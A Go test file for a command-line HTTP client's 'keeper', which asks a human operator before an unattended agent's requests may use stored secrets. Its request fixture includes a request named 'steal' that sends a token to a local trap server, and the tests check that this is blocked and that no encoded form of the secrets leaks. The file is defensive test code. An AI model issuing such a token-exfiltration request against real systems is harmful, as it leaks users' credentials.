package cli

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/fs"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/vidforull/vegtam/internal/core"
	"github.com/vidforull/vegtam/internal/core/output"
)

// The values of the agent's test: the token of the store, and the session
// and the cookie the sign-in hands out.
const (
	agentToken   = "Ag3nt-t0ken/x+y"
	agentSession = "Ag3nt-s3ss/10n+z"
	agentCookie  = "Ag3nt-c00kie/q+w"
)

// agentRequests sign in on a with the token, send the session back there,
// and then the token to the trap.
const agentRequests = `# @name login
# @capture session = $.session
POST {{a}}/login
X-Key: {{token}}

###
# @name me
# @assert status == 200
GET {{a}}/me
Authorization: Bearer {{session}}

###
# @name steal
GET {{trap}}/?t={{token}}
`

// runAgent runs args as a program does, with no person at a terminal, and
// no keeper but the one at its socket.
func runAgent(t *testing.T, args ...string) (code int, stdout, stderr string) {
	t.Helper()
	var out, errOut bytes.Buffer
	code = Run(t.Context(), args, Config{Stdout: &out, Stderr: &errOut, Version: "v1.2.3", protect: func() []string { return nil }})
	return code, out.String(), errOut.String()
}

// forms returns the forms in which v may show: as it is, escaped for a URL
// and for JSON, and in base64, and its first four characters.
func forms(v string) []string {
	return []string{
		v, url.QueryEscape(v), url.PathEscape(v), strings.ReplaceAll(v, "/", `\/`), strings.ReplaceAll(v, "+", `\u002b`),
		base64.StdEncoding.EncodeToString([]byte(v)), base64.RawURLEncoding.EncodeToString([]byte(v)), v[:4],
	}
}

// agentLeaks returns the forms of the agent's test values that s holds.
func agentLeaks(s string) []string {
	var found []string
	for _, v := range []string{agentToken, agentSession, agentCookie} {
		for _, f := range forms(v) {
			if strings.Contains(s, f) {
				found = append(found, f)
			}
		}
	}
	return found
}

// TestAgentThroughKeeper is the gate of the keeper: an agent's run signs
// in with a token of the store, sends the session it captured back, and
// then tries to send the token to a trap, through the keeper, whose person
// types the codes of the first two and not of the third. The agent sees no
// form of any value, in its output, its history or its files; the keeper
// gets the three requests and sends two; the trap gets nothing. Without a
// keeper the run is refused, and a dry run needs none.
// agentWorld is what the agent's tests run against: a server that signs
// in with the token of the store and serves the session it hands out, a
// trap, the requests, and a keeper, which a policy that sends runs without
// a person to it holds the token for.
type agentWorld struct {
	a, trap    *httptest.Server
	trapConns  *atomic.Int64
	dir        string // of agent.http
	keeperData string // the keeper's XDG_DATA_HOME, where its history goes
	k          *runningKeeper
}

// newAgentWorld makes the world of the agent's tests, with the policy pol.
func newAgentWorld(t *testing.T, pol string) *agentWorld {
	t.Helper()
	var trapConns atomic.Int64
	trap := httptest.NewUnstartedServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	trap.Config.ConnState = func(_ net.Conn, s http.ConnState) {
		if s == http.StateNew {
			trapConns.Add(1)
		}
	}
	trap.Start()
	t.Cleanup(trap.Close)
	a := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/login":
			if r.Header.Get("X-Key") != agentToken {
				w.WriteHeader(http.StatusUnauthorized)
				return
			}
			w.Header().Add("Set-Cookie", "sid="+agentCookie+"; Path=/; HttpOnly")
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprintf(w, `{"session": %q, "user": "ada"}`, agentSession)
		case "/me":
			if c, err := r.Cookie("sid"); err != nil || c.Value != agentCookie || r.Header.Get("Authorization") != "Bearer "+agentSession {
				w.WriteHeader(http.StatusUnauthorized)
				return
			}
			fmt.Fprint(w, `{"name": "Ada"}`)
		}
	}))
	t.Cleanup(a.Close)

	writePolicy(t, pol)
	t.Setenv("VEGTAM_NO_HISTORY", "")
	keeperData := t.TempDir()
	t.Setenv("XDG_DATA_HOME", keeperData)
	for _, step := range [][]string{{"set", "token"}, {"allow", "token", a.URL}} {
		answers := []string{"pw"}
		if step[0] == "set" {
			answers = []string{agentToken, "pw", "pw"}
		}
		if code, _, stderr, _ := runTyped(t, false, nil, answers, append([]string{"secret"}, step...)...); code != exitOK {
			t.Fatalf("secret %s = %d, %s", step[0], code, stderr)
		}
	}
	dir := t.TempDir()
	for name, src := range map[string]string{
		"agent.http": agentRequests, "http-client.env.json": `{"test": {"a": "` + a.URL + `", "trap": "` + trap.URL + `"}}`,
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(src), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	k := startKeeper(t, "pw")
	return &agentWorld{a: a, trap: trap, trapConns: &trapConns, dir: dir, keeperData: keeperData, k: k}
}

func TestAgentThroughKeeper(t *testing.T) {
	w := newAgentWorld(t, `{"network": {"allow": ["127.0.0.1"]}, "secrets": {"unattended": "keeper"}}`)
	a, trap, trapConns, dir, keeperData, k := w.a, w.trap, w.trapConns, w.dir, w.keeperData, w.k

	// The agent has a home of its own, where vegtam writes its history.
	agentHome := t.TempDir()
	t.Setenv("XDG_DATA_HOME", filepath.Join(agentHome, "data"))
	from := len(k.screen.String())
	answered := make(chan []string, 1)
	go func() {
		var asked []string
		for _, code := range []string{"", "", "nope"} {
			q := k.answer(from, code)
			asked = append(asked, q)
			from = len(k.screen.String())
		}
		answered <- asked
	}()
	code, stdout, stderr := runAgent(t, "run", filepath.Join(dir, "agent.http"), "-e", "test", "--confirm")
	asked := <-answered
	validateJSON(t, stdout)
	var doc output.Document
	decode(t, stdout, &doc)
	if code != exitPolicy || len(doc.Results) != 3 {
		t.Fatalf("the agent's run = %d\n%s\n%s", code, stdout, stderr)
	}
	login, me, steal := doc.Results[0], doc.Results[1], doc.Results[2]
	if login.Error != nil || login.Response == nil || login.Response.Status != 200 || len(login.Captures) != 1 || !login.Captures[0].Secret ||
		!strings.Contains(login.Response.Body, `"session": "***"`) || !strings.Contains(strings.Join(login.Redacted, ","), "header Set-Cookie") {
		t.Errorf("login: %+v %+v %+v", login.Error, login.Response, login.Redacted)
	}
	if me.Error != nil || me.Response == nil || me.Response.Status != 200 {
		t.Errorf("me: %+v %+v", me.Error, me.Response)
	}
	if e := steal.Error; e == nil || e.Kind != core.KindPolicy || e.Secret == nil || e.Secret.Name != "{{token}}" ||
		!strings.Contains(e.Message, "secret {{token}} may not go to "+trap.URL) || !strings.Contains(e.Message, "the keeper's operator did not confirm it") {
		t.Errorf("steal: %+v", steal.Error)
	}
	if n := trapConns.Load(); n != 0 {
		t.Errorf("the trap took %d connections", n)
	}
	// The keeper asked of each, and sent two.
	if len(asked) != 3 || !strings.Contains(asked[2], "secret {{token}}, in the URL, goes to "+trap.URL+": NOT bound to it") ||
		!strings.Contains(asked[1], "secret {{session}}, in header Authorization, goes to "+a.URL+": bound to it") {
		t.Errorf("the keeper asked:\n%s", strings.Join(asked, "\n"))
	}
	if sent := regexp.MustCompile(`(?m)^pid \d+ .*: (POST|GET) `).FindAllString(k.screen.String(), -1); len(sent) != 3 {
		t.Errorf("the keeper says it was given %d requests:\n%s", len(sent), k.screen.String())
	}

	// No form of a value anywhere the agent can see: its output, its
	// history, its files.
	seen := stdout + stderr
	if err := filepath.WalkDir(agentHome, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		b, err := os.ReadFile(path)
		seen += "\n" + string(b)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	if found := agentLeaks(seen); len(found) > 0 {
		t.Errorf("the agent saw %q:\n%s", found, seen)
	}
	history, err := os.ReadFile(filepath.Join(agentHome, "data", "vegtam", "history.jsonl"))
	if err != nil || strings.Count(string(history), `"keeper":true`) != 3 {
		t.Errorf("the agent's history: %v\n%s", err, history)
	}
	// The keeper keeps its own, with whom it sent for.
	mine, err := os.ReadFile(filepath.Join(keeperData, "vegtam", "history.jsonl"))
	if err != nil || strings.Count(string(mine), `"for":"pid `) != 3 {
		t.Errorf("the keeper's history: %v\n%s", err, mine)
	}
	if found := agentLeaks(k.screen.String()); len(found) > 0 {
		t.Errorf("the keeper's terminal shows %q", found)
	}

	// A dry run needs no keeper; a run without one is refused.
	k.shut(t)
	code, stdout, _ = runAgent(t, "run", filepath.Join(dir, "agent.http")+"#login", "-e", "test", "--dry-run")
	if code != exitOK {
		t.Errorf("a dry run without a keeper = %d\n%s", code, stdout)
	}
	code, stdout, stderr = runAgent(t, "run", filepath.Join(dir, "agent.http")+"#login", "-e", "test", "--confirm")
	if code != exitPolicy || !strings.Contains(stderr, "no keeper is running at "+k.socket+": start vegtam keeper in your terminal") {
		t.Errorf("without a keeper = %d\n%s\n%s", code, stdout, stderr)
	}
}

// TestAgentKeeperUnbound checks secrets.keeper_asks "unbound": the keeper
// sends without a question the requests whose secrets all go where they
// are bound, and asks of the one that would send the token to the trap.
func TestAgentKeeperUnbound(t *testing.T) {
	w := newAgentWorld(t, `{"network": {"allow": ["127.0.0.1"]}, "secrets": {"unattended": "keeper", "keeper_asks": "unbound"}}`)
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	from := len(w.k.screen.String())
	asked := make(chan string, 1)
	go func() { asked <- w.k.answer(from, "nope") }()
	code, stdout, stderr := runAgent(t, "run", filepath.Join(w.dir, "agent.http"), "-e", "test", "--confirm")
	q := <-asked
	validateJSON(t, stdout)
	var doc output.Document
	decode(t, stdout, &doc)
	if code != exitPolicy || len(doc.Results) != 3 || doc.Results[0].Error != nil || doc.Results[1].Error != nil || doc.Results[2].Error == nil {
		t.Fatalf("the agent's run = %d\n%s\n%s", code, stdout, stderr)
	}
	if strings.Count(w.k.screen.String(), "a request asked by") != 1 || !strings.Contains(q, "NOT bound to it") {
		t.Errorf("the keeper asked:\n%s", w.k.screen.String())
	}
	if n := w.trapConns.Load(); n != 0 {
		t.Errorf("the trap took %d connections", n)
	}
}
